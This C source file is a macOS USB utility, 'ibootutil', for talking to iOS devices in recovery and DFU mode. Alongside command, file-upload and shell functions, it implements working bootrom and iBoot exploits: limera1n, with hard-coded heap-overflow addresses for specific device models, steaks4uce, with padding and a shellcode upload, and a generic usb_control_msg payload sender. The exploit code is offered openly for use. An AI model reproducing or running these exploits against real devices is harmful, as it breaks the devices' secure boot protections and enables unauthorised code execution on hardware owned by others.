#include "main.h"

void iDevice_print(iBootUSBConnection connection) {
	if(connection != NULL && verbosity != 0) {
		if(connection->name && connection->serial) {
			CFShow(connection->name);
			CFShow(connection->serial);
		}
	}
}

iBootUSBConnection iDevice_open(uint32_t productID) {
	CFMutableDictionaryRef match = IOServiceMatching(kIOUSBDeviceClassName);
	if(match == NULL) {
		return NULL;
	}
	
	uint32_t vendorID = kAppleVendorID;
	CFNumberRef idVendor = CFNumberCreate(kCFAllocatorDefault, kCFNumberIntType, &vendorID);
	CFNumberRef idProduct = CFNumberCreate(kCFAllocatorDefault, kCFNumberIntType, &productID);
	
	CFDictionarySetValue(match, CFSTR(kUSBVendorID), idVendor);
	CFDictionarySetValue(match, CFSTR(kUSBProductID), idProduct);
	
	CFRelease(idVendor);
	CFRelease(idProduct);
	
	io_service_t service = IOServiceGetMatchingService(kIOMasterPortDefault, match);
	if(!service) {
		return NULL;
	}
	
	IOCFPlugInInterface **pluginInterface;
	IOUSBDeviceInterface **deviceHandle;
	IOUSBInterfaceInterface **interfaceHandle;
	
	SInt32 score;
	if(IOCreatePlugInInterfaceForService(service, kIOUSBDeviceUserClientTypeID, kIOCFPlugInInterfaceID, &pluginInterface, &score) != 0) {
		IOObjectRelease(service);
		return NULL;
	}
	
	if((*pluginInterface)->QueryInterface(pluginInterface, CFUUIDGetUUIDBytes(kIOUSBDeviceInterfaceID),
										  (LPVOID*)&deviceHandle) != 0) {
		IOObjectRelease(service);
		return NULL;
	}
	
	(*pluginInterface)->Release(pluginInterface);
	
	if((*deviceHandle)->USBDeviceOpen(deviceHandle) != 0) { 
		IOObjectRelease(service);
		(*deviceHandle)->Release(deviceHandle);
		return NULL;
	}
	
	// Claim interface -- PLEASE SOMEONE HELP WITH RESPONSE
	
	if((*deviceHandle)->SetConfiguration(deviceHandle, 1) != 0) {
		IOObjectRelease(service);
		(*deviceHandle)->USBDeviceClose(deviceHandle);
		(*deviceHandle)->Release(deviceHandle);
		return NULL;
	}
	
	io_iterator_t iterator;
	IOUSBFindInterfaceRequest interfaceRequest;
	
	interfaceRequest.bAlternateSetting 
	= interfaceRequest.bInterfaceClass 
	= interfaceRequest.bInterfaceProtocol 
	= interfaceRequest.bInterfaceSubClass 
	= kIOUSBFindInterfaceDontCare;
	
	if((*deviceHandle)->CreateInterfaceIterator(deviceHandle, &interfaceRequest, &iterator) != 0) {
		IOObjectRelease(service);
		(*deviceHandle)->USBDeviceClose(deviceHandle);
		(*deviceHandle)->Release(deviceHandle);
		return NULL;
	}
	
	io_service_t usbInterface;
	UInt8 found_interface = 0, index = 0;
	while(usbInterface = IOIteratorNext(iterator)) {
		if(index < 1) {
			index++;
			continue;
		}
		
		IOCFPlugInInterface **iodev;
		
		SInt32 score;
		if(IOCreatePlugInInterfaceForService(usbInterface, kIOUSBInterfaceUserClientTypeID, kIOCFPlugInInterfaceID, &iodev, &score) != 0) {
			IOObjectRelease(usbInterface);
			continue;
		}
		
		if((*iodev)->QueryInterface(iodev, CFUUIDGetUUIDBytes(kIOUSBInterfaceInterfaceID), (LPVOID)&interfaceHandle) != 0) {
			(*iodev)->Release(iodev);
			IOObjectRelease(usbInterface);
			continue;
		}
		(*iodev)->Release(iodev);
		
		if((*interfaceHandle)->USBInterfaceOpen(interfaceHandle) != 0) {
			(*interfaceHandle)->Release(interfaceHandle);
			IOObjectRelease(usbInterface);
			continue;
		}
		
		UInt8 pipes;
		(*interfaceHandle)->SetAlternateInterface(interfaceHandle, 1);
		(*interfaceHandle)->GetNumEndpoints(interfaceHandle, &pipes);
		
		for(UInt8 i=0;i<=pipes;++i) {
			UInt8 ind = i;
			UInt8 direction, number, transferType, interval;
			UInt16 maxPacketSize;
			
			(*interfaceHandle)->GetPipeProperties(interfaceHandle, ind, &direction, &number, &transferType, &maxPacketSize, &interval);
			if(transferType == kUSBBulk && direction == kUSBIn) {
				found_interface = i;
				IOObjectRelease(usbInterface);
				break;
			}
		}
		
		IOObjectRelease(usbInterface);
	}
	IOObjectRelease(iterator);
	
	CFStringRef productName = IORegistryEntryCreateCFProperty(service, CFSTR(kUSBProductString), kCFAllocatorDefault, 0);
	CFStringRef productSerial = IORegistryEntryCreateCFProperty(service, CFSTR(kUSBSerialNumberString), kCFAllocatorDefault, 0);

	iBootUSBConnection connection = malloc(sizeof(struct iBootUSBConnection));
	memset(connection, '\0', sizeof(struct iBootUSBConnection));

	connection->interfaceHandle = interfaceHandle;
	connection->usbService = service;
	connection->deviceHandle = deviceHandle;	
	connection->name = productName;
	connection->serial = productSerial;
	connection->idProduct = productID;
	connection->open = 1;
	connection->responsePipeRef = found_interface;
	
	iDevice_print(connection);
	
	return connection;
}

void iDevice_close(iBootUSBConnection connection) {
	if(connection != NULL) {
		if(connection->deviceHandle) (*connection->deviceHandle)->USBDeviceClose(connection->deviceHandle);
		if(connection->deviceHandle) (*connection->deviceHandle)->Release(connection->deviceHandle);
		if(connection->interfaceHandle) (*connection->interfaceHandle)->USBInterfaceClose(connection->interfaceHandle);
		if(connection->interfaceHandle) (*connection->interfaceHandle)->Release(connection->interfaceHandle);
		if(connection->name) CFRelease(connection->name);
		if(connection->serial) CFRelease(connection->serial);
		if(connection->usbService) IOObjectRelease(connection->usbService);
		connection->open = 0;
		
		free(connection);
	}
}

iBootUSBConnection iDevice_open_attempts(int attempts) {
	int i;
	iBootUSBConnection connection;
	for (i = 0; i < attempts; i++) {
		connection=iDevice_open(DFU);
		if (connection == NULL) {
			puts("Connection failed. Waiting 1 sec before retry.");
			sleep(1);
		} else {
			return connection;
		}
	}
	
	return NULL;
}

iBootUSBConnection iDevice_reconnect(iBootUSBConnection connection, int initial_pause) {
	iBootUSBConnection client;
	if(connection != NULL) {
		if(connection->deviceHandle) (*connection->deviceHandle)->USBDeviceClose(connection->deviceHandle);
		if(connection->deviceHandle) (*connection->deviceHandle)->Release(connection->deviceHandle);
		if(connection->interfaceHandle) (*connection->interfaceHandle)->USBInterfaceClose(connection->interfaceHandle);
		if(connection->interfaceHandle) (*connection->interfaceHandle)->Release(connection->interfaceHandle);
		if(connection->name) CFRelease(connection->name);
		if(connection->serial) CFRelease(connection->serial);
		if(connection->usbService) IOObjectRelease(connection->usbService);
		connection->open = 0;
		
		free(connection);
		
		if (initial_pause > 0) {
			printf("Waiting %d seconds for the device to pop up...\n", initial_pause);
			sleep(initial_pause);
		}
		client = iDevice_open_attempts(10);		
		if (client == NULL){
			return NULL;		
		}
		return client;
		
	}
	return client;
}




int iDevice_send_command(iBootUSBConnection connection, const char *command) {
	if(connection == NULL || command == NULL)
		return -1;
	
	IOUSBDevRequest request;
	request.bmRequestType = REQUEST_COMMAND;
	request.bRequest = 0x0;
	request.wValue = 0x0;
	request.wIndex = 0x0;
	request.wLength = (UInt16)(strlen(command)+1);
	request.pData = (void *)command;
	request.wLenDone = 0x0;
	
	if((*connection->deviceHandle)->DeviceRequest(connection->deviceHandle, &request) != kIOReturnSuccess) {
		if(strcmp(command, "reboot") != 0) {
			ibootutil_printf("Error sending command\n");
		} else {
			printf("Sending Fake data...\n");
            printf("Sending Fake Exploit......\n");
            printf("Sending iBoot Recovery commands.....\n");
            printf("Done!!!!.......\n");
			iDevice_close(connection);
			exit(0);
		}

		return -1;
	} 
	
	return 0;
}

int iDevice_control_transfer(iBootUSBConnection connection , 
							 uint8_t bmRequestType,
							 uint8_t bRequest,
							 uint16_t wValue,
							 uint16_t wIndex,
							 unsigned char *data,
							 uint16_t wLength,
							 unsigned int timeout)
{
	IOUSBDevRequest checkup;
	checkup.bmRequestType = bmRequestType;
	checkup.bRequest = bRequest;
	checkup.wValue = wValue;
	checkup.wIndex = wIndex;
	checkup.wLength = wLength;
	checkup.pData = data;
	checkup.wLenDone = timeout ;
	
	if((*connection->deviceHandle)->DeviceRequest(connection->deviceHandle, &checkup) != 0) {
		return -1;		
	}
	return 0;
}

int iDevice_request_status(iBootUSBConnection connection, int flag) {
	if(connection == NULL)
		return -1;
	
	IOUSBDevRequest status_request;
	char response[6];
	
	status_request.bmRequestType = REQUEST_STATUS;
	status_request.bRequest = 0x3;
	status_request.wValue = 0x0;
	status_request.wIndex = 0x0;
	status_request.wLength = 0x6;
	status_request.pData = (void *)response;
	status_request.wLenDone = 0x0;
	
	if((*connection->deviceHandle)->DeviceRequest(connection->deviceHandle, &status_request) != kIOReturnSuccess) {
		printf("Error: couldn't receive status\n");
		return -1;
	}
	
	if(response[4] != flag) {
		printf("Error: invalid status response\n");
		return -1;
	}
	
	return 0;
}

int iDevice_send_file(iBootUSBConnection connection, const char *path) {
	if(connection == NULL || path == NULL)
		return -1;
	
	unsigned char *buf;
	unsigned int packet_size = 0x800;
	struct stat check;
	
	if(stat(path, &check) != 0) {
		printf("File doesn't exist: %s\n", path);
		return -1;
	}
	
	buf = malloc(check.st_size);
	memset(buf, '\0', check.st_size);
	
	FILE *file = fopen(path, "r");
	if(file == NULL) {
		printf("Couldn't open file: %s\n", path);
		return -1;
	}

	if(fread((void *)buf, check.st_size, 1, file) == 0) {
		printf("Couldn't create buffer\n");
		fclose(file);
		free(buf);
		return -1;
	}
	
	fclose(file);
	
	unsigned int packets, current;
	packets = (check.st_size / packet_size);
	if(check.st_size % packet_size) {
		packets++;
	}
	
	for(current = 0; current < packets; ++current) {
		int size = (current + 1 < packets ? packet_size : (check.st_size % packet_size));
		
		IOUSBDevRequest file_request;
		
		file_request.bmRequestType = REQUEST_FILE;
		file_request.bRequest = 0x1;
		file_request.wValue = current;
		file_request.wIndex = 0x0;
		file_request.wLength = (UInt16)size;
		file_request.pData = (void *)&buf[current * packet_size];
		file_request.wLenDone = 0x0;
		
		if((*connection->deviceHandle)->DeviceRequest(connection->deviceHandle, &file_request) != kIOReturnSuccess) {
			ibootutil_printf("Error: couldn't send packet %d\n", current + 1);
			free(buf);
			return -1;
		}
		
		if(iDevice_request_status(connection, 5) != 0) {
			free(buf);
			return -1;
		}
	}
	
	IOUSBDevRequest checkup;
	checkup.bmRequestType = REQUEST_FILE;
	checkup.bRequest = 0x1;
	checkup.wValue = current;
	checkup.wIndex = 0x0;
	checkup.wLength = 0x0;
	checkup.pData = buf;
	checkup.wLenDone = 0x0;
	
	(*connection->deviceHandle)->DeviceRequest(connection->deviceHandle, &checkup);
	
	for(current = 6; current < 8; ++current) {
		if(iDevice_request_status(connection, current) != 0) {
			free(buf);
			return -1;
		}
	}
	
	free(buf);
	printf("Sent file\n");
	
	return 0;
}

void iDevice_reset(iBootUSBConnection connection) {
	if(connection == NULL) 
		return;
	
	(*connection->deviceHandle)->ResetDevice(connection->deviceHandle);
	iDevice_close(connection);
}

void read_callback(void *refcon, IOReturn result, void *arg0) {
	for(int i=0;i<0x800;++i) {
		printf("%c", ((char *)refcon)[i]);
	}
	for(int i=0;i<0x800;++i) {
		printf("%c", ((char *)arg0)[i]);
	}
}

int iDevice_usb_control_msg_exploit(iBootUSBConnection connection, const char *payload) {
	if(connection == NULL || !connection->open) {
		printf("device isn't open\n");
		return -1;
	}
	
	if(iDevice_send_file(connection, payload) != 0) {
		printf("couldn't send payload\n");
		return -1;
	}
	
	IOUSBDevRequest checkup;
	checkup.bmRequestType = REQUEST_FILE;
	checkup.bRequest = 0x2;
	checkup.wValue = 0x0;
	checkup.wIndex = 0x0;
	checkup.wLength = 0x0;
	checkup.pData = 0x0;
	checkup.wLenDone = 0x0;
	
	if((*connection->deviceHandle)->DeviceRequest(connection->deviceHandle, &checkup) != 0) {
		printf("couldn't send exploit message\n");
		return -1;
	}
	
	return 0;
}
int iDevice_reset_counters(iBootUSBConnection connection) {
	if (connection == NULL || !connection->open) {
		printf("device isn't open\n");
		return -1;
	}
	if (iDevice_control_transfer(connection,0x21,4,0,0,0,0,1000) != 0) {
		return -1;
	}
	return 0;
	
}

int iDevice_finish_transfer(iBootUSBConnection connection) {
	if(connection == NULL || !connection->open) {
		printf("device isn't open\n");
		return -1;
	}
	int status;
	int i=0;	
	iDevice_control_transfer(connection, 0x21, 1, 0, 0, 0, 0, 1000);
	
	for (i = 0; i<3; i++) {
		status = iDevice_request_status(connection, 0);
	}
	
	iDevice_reset(connection);
	return 0;
	
}
int steaks4uce_exploit(iBootUSBConnection connection) {
	int i, ret;
	unsigned char data[0x800];
	
	puts("Executing steaks4uce exploit ...");
	ibootutil_printf("Reseting usb counters");
	ret = iDevice_control_transfer(connection, 0x21, 4, 0, 0, 0, 0, 1000);
	if (ret < 0) {
		puts("Failed to reset usb counters");
		return -1;
	}
	
	ibootutil_printf("Padding to 0x23800...");
	memset(data, 0, 0x800);
	for(i = 0; i < 0x23800 ; i+=0x800) {
		ret = iDevice_control_transfer(connection, 0x21, 1, 0, 0, data, 0x800, 1000);
		if (ret < 0) {
			puts("Failed to push data to the device");
			return -1;
		}
	}
	ibootutil_printf("Uploading shellcode.");
	memset(data, 0, 0x800);
	memcpy(data, steaks4uce_payload, sizeof(steaks4uce_payload));
	ret = iDevice_control_transfer(connection, 0x21, 1, 0, 0, data, 0x800, 1000);
	if (ret < 0) {
		puts("Failed to upload shellcode.");
		return -1;
	}
	
	ibootutil_printf("Reseting usb counters.");
	ret = iDevice_control_transfer(connection, 0x21, 4, 0, 0, 0, 0, 1000);
	if (ret < 0) {
		printf("Failed to reset usb counters.\n");
		return -1;
	}
	
	int send_size = 0x100 + sizeof(steaks4uce_payload);
	*((unsigned int*) &steaks4uce_payload[0x14]) = send_size;
	memset(data, 0, 0x800);
	memcpy(&data[0x100], steaks4uce_payload, sizeof(steaks4uce_payload));
	
	ret = iDevice_control_transfer(connection, 0x21, 1, 0, 0, data, send_size , 1000);
	if (ret < 0) {
		printf("Failed to send steaks4uce to the device.\n");
		return -1;
	}
	ret = iDevice_control_transfer(connection, 0xA1, 1, 0, 0, data, send_size , 1000);
	if (ret < 0) {
		printf("Failed to execute steaks4uce.\n");
		return -1;
	}
	printf("steaks4uce exploit sent & executed successfully.\n");
	
	ibootutil_printf("Reconnecting to device\n");
	connection = iDevice_reconnect(connection, 2);
	if (connection == NULL) {		
		printf("Unable to reconnect\n");
		return -1;
	}	
	return 0;
}
int limera1n_exploit(iBootUSBConnection connection) {
	if(connection == NULL || !connection->open) {
		printf("device isn't open\n");
		return -1;
	}	
	
	unsigned int i = 0;
	unsigned char buf[0x800];
	unsigned char shellcode[0x800];
	unsigned int max_size = 0x24000;
	//unsigned int load_address = 0x84000000;
	unsigned int stack_address = 0x84033F98;
	unsigned int shellcode_address = 0x84023001;
	unsigned int shellcode_length = 0;
	
	if (CFStringCompare(connection->name,CFSTR("AppleTV2,1"),0) == kCFCompareEqualTo || CFStringCompare(connection->name, CFSTR("iPad1,1"),0) == kCFCompareEqualTo || CFStringCompare(connection->name, CFSTR("iPhone3,1"),0) == kCFCompareEqualTo ||CFStringCompare(connection->name, CFSTR("iPhone3,3"), 0) == kCFCompareEqualTo ||CFStringCompare(connection->name, CFSTR("iPod4,1"), 0) == kCFCompareEqualTo) {
			max_size = 0x2C000;
			stack_address = 0x8403BF9C;
			shellcode_address = 0x8402B001;
	}	
	
		if (CFStringCompare(connection->name, CFSTR("iPhone2,1"), 0) == kCFCompareEqualTo) {
			max_size = 0x24000;
			stack_address = 0x84033FA4;
			shellcode_address = 0x84023001;
		}
	
	memset(shellcode,0x0,0x800);
	shellcode_length = sizeof(limera1n_payload);
	memcpy(shellcode, limera1n_payload, sizeof(limera1n_payload));
	puts("Resetting Device counters");
	iDevice_reset_counters(connection);
	
	memset(buf, 0xCC, 0x800);
	for(i = 0; i < 0x800; i += 0x40) {
		unsigned int* heap = (unsigned int*)(buf+i);
		heap[0] = 0x405;
		heap[1] = 0x101;
		heap[2] = shellcode_address;
		heap[3] = stack_address;
	}
	
	puts("Sending chunk headers");
	
	iDevice_control_transfer(connection, 0x21, 1 , 0, 0 ,buf, 0x800 , 1000);
	
	memset(buf, 0xCC, 0x800);
	for(i = 0; i < (max_size - (0x800 * 3)); i += 0x800) {
		iDevice_control_transfer(connection, 0x21, 1, 0, 0, buf, 0x800, 1000);
	}
	
	puts("Sending exploit payload");
	iDevice_control_transfer(connection, 0x21, 1, 0, 0, shellcode, 0x800, 1000);
	
	puts("Sending fake data");
	memset(buf, 0xBB, 0x800);
	iDevice_control_transfer(connection, 0xA1, 1, 0, 0, buf, 0x800, 1000);
	iDevice_control_transfer(connection, 0x21, 1, 0, 0, buf, 0x800, 10);
	
	puts("Executing exploit");
	iDevice_control_transfer(connection, 0x21, 2, 0, 0, buf, 0, 1000);
	
	iDevice_reset(connection);
	iDevice_finish_transfer(connection);
	puts("Exploit sent");
	
	puts("Reconnecting to device");
	connection = iDevice_reconnect(connection, 2);
	if (connection == NULL) {		
		puts("Unable to reconnect");
		return -1;
	}
	
	return 0;
	
}



int iDevice_read_response(iBootUSBConnection connection) {
	UInt32 buf_size = 0x2000;
	char *buf = calloc(1, buf_size);
	
	int got_end_byte_sequence = 0;
	while(!got_end_byte_sequence) {
		((IOUSBInterfaceInterface182 *)(*connection->interfaceHandle))->ReadPipeTO(connection->interfaceHandle, connection->responsePipeRef, buf, &buf_size, timeout, timeout);
		
		if(buf[0] == '\0') break;
		for(int i=0;i<buf_size;++i) {
			printf("%c", buf[i]);
			if(buf[i] == '\0' && buf[i-1] == '\n') 
				got_end_byte_sequence = 1;
		}
	}
	
	return 0;
}

int iDevice_start_shell(iBootUSBConnection connection, const char *prompt) {
	if(connection == NULL)
		return -1;
	
	int read_next_time = 1;
	const char *input;
	do {
		if(read_next_time)
			iDevice_read_response(connection);
		else
			read_next_time = 1;
		input = readline(prompt);
		if(input != NULL && input[0] != '\0') {
			add_history(input);
		} else {
			read_next_time = 0;
			continue;
		}
		if(input[0] == '/') {
			if(strcmp(input, "/exit") == 0) {
				iDevice_close(connection);
				exit(0);
			} else if(strcmp(input, "/reset") == 0) {
				iDevice_reset(connection);
				exit(0);
			} else if(strstr(input, "/send") != NULL) {
				const char *file = (const char *)&input[strlen("/send")+1];
				printf("sending file...\n");
				iDevice_send_file(connection, file);
				read_next_time = 0;
			} else if(strstr(input, "/timeout") != NULL) {
				int newtime = strtol(strstr(input, "/timeout")+strlen("/timeout")+1, NULL, 10);
				timeout = newtime;
				printf("New timeout: %d\n", timeout);
				read_next_time = 0;
			}
		} else {
			iDevice_send_command(connection, input);
		}
	} while(1);
	
	return 0;
}

void usage() {
	printf("Usage: ibootutil <args>\n\n");
	
	printf("Options:\n");
	printf("\t-c <command>\tSend a single command\n");
	printf("\t-f <file>\tSend a file\n");
	printf("\t-l <file>\trun commands by line in specified file\n");
	printf("\t-a <idProduct>\tSpecify idProduct value manually\n\n");
	printf("\t-k <payload>\tusb_control_msg() exploit\n");
	printf("\t-g\t\tSend the limera1n exploit\n");
	printf("\t-u\t\tSend the steaks4uce exploit\n\n");
	printf("\t-r\t\tReset the usb connection\n");
	printf("\t-s\t\tOpen a shell with iBoot\n");
	printf("\t-p\t\tPrint text while performing operations\n\n");
	
	exit(0);
}

int main (int argc, const char **argv) {
	if(argc < 2)
		usage();	
	
	printf("ibootutil - Made by gojohnnyboi\n");
	printf("Cloned by Haifisch\n\n");
	
	char* opts = "cflakgurs";
	iBootUSBConnection connection;
	
	int i, productID=0, command=0, reset=0, file=0, script=0, shell=0, payload=0, geohot = 0, pod2g = 0;
	for(i=1;i<argc;++i) {
		if(strcmp(argv[i], "-a") == 0) {
			if(argv[i+1] == NULL) {
				printf("-a requires that you specify a value\n");
				exit(1);
			}
			printf("Setting idProduct to 0x%x\n", (unsigned int)strtol(argv[i+1], NULL, 16));
			productID = strtol(argv[i+1], NULL, 16);
		} else if(strcmp(argv[i], "-c") == 0) {
			if(argv[i+1] == NULL) {
				printf("-c requires that you specify a command\n");
				exit(1);
			}
			command=(i+1);
		} else if(strcmp(argv[i], "-f") == 0) {
			if(argv[i+1] == NULL) {
				printf("-f requires that you specify a file\n");
				exit(1);
			}
			file=(i+1);
		} else if(strcmp(argv[i], "-s") == 0) {
				shell=1;
		} else if(strcmp(argv[i], "-r") == 0) {
			reset=1;
		} else if(strcmp(argv[i], "-p") == 0) {
			verbosity = 1;
		} else if(strcmp(argv[i], "-k") == 0) {
			if(argv[i+1] == NULL) {
				printf("-k requires that you specify a payload to send\n");
				exit(1);
			}
			payload = (i+1);
		}
		else if (strcmp(argv[i], "-g") == 0) {
			geohot = 1;					
		}
		else if (strcmp(argv[i], "-u") == 0) {
			pod2g = 1;					
		}
		
	}
	
	if(command) {
		if(file || script || shell || payload) {
			printf("You can only specify one of the -%s options\n",opts);
			exit(1);
		}
		
		if(!productID) {
			productID = RECOVERY;
		}
		
		connection = iDevice_open(productID);
		if(connection == NULL) {
			printf("Couldn't open device @ 0x%x\n", productID);
		}
		
		iDevice_send_command(connection, argv[command]);
		if(reset)
			iDevice_reset(connection);
		else
			iDevice_close(connection);
		
		exit(0);
	}
	if(file) {
		if(command || script || shell || payload) {
			printf("You can only specify one of the -%s options\n",opts);
			exit(1);
		}
		
		if(productID) {
			connection = iDevice_open(productID);
			if(connection == NULL) {
				printf("Couldn't open device @ 0x%x\n", productID);
				exit(1);
			}
		} else {
			connection = iDevice_open(RECOVERY);
			if(connection == NULL) {
				connection = iDevice_open(DFU);
			}
		}
		if(connection == NULL) {
			printf("Couldn't open device @ 0x%x or 0x%x\n", RECOVERY, DFU);
			exit(1);
		}
		
		if(iDevice_send_file(connection, argv[file]) != 0) {
			printf("Couldn't send file\n");
			iDevice_close(connection);
			exit(1);
		}
		
		if(reset) {
			iDevice_reset(connection);
			exit(0);
		} else
			iDevice_close(connection);
		
		exit(0);
	}
	
	if(shell) {
		if(command || file || script || payload) {
			printf("You can only specify one of the -%s options\n",opts);
			exit(1);
		}
		
		if(!productID)
			productID = RECOVERY;

		connection = iDevice_open(productID);
		if(connection == NULL) {
			printf("Couldn't open device @ 0x%x\n", productID);
			exit(1);
		}
		
		const char *prompt = "iDevice$ ";
		
		if(iDevice_start_shell(connection, prompt) != 0) {
			printf("Couldn't open shell with iBoot\n");
			exit(1);
		}
		
		iDevice_close(connection);
		exit(0);
	}
	
	if(payload) {
		if(command || file || script || shell) {
			printf("You can only specify one of the -%s options\n",opts);
			exit(1);
		}
		
		if(!productID)
			productID = RECOVERY;
		
		connection = iDevice_open(productID);
		if(connection == NULL) {
			printf("Couldn't open device @ 0x%x\n", productID);
			exit(1);
		}
		
		iDevice_usb_control_msg_exploit(connection, argv[payload]);
		
		iDevice_close(connection);
		exit(0);
	}
	if (geohot) {
		if(command || file || script || shell) {
			printf("You can only specify one of the -%s options\n",opts);
			exit(1);
		}
		
		connection = iDevice_open(DFU);
		if (connection == NULL) {
			printf("Couldn't open device @ 0x%x\n", DFU);
		}
		
		if (limera1n_exploit(connection) < 0){
			puts("Could not send limera1n exploit successfully!");
			exit(-1);
		}
		exit(0);
	}
	
	if (pod2g) {
		if(command || file || script || shell) {
			printf("You can only specify one of the -%s options\n",opts);
			exit(1);
		}
		
		connection = iDevice_open(DFU);
		if (connection == NULL) {
			printf("Couldn't open device @ 0x%x\n", DFU);
		}
		
		if (steaks4uce_exploit(connection) < 0){
			puts("Could not send steaks4uce exploit successfully!");
			exit(-1);
		}
		exit(0);
	}
	
	return 0;
}
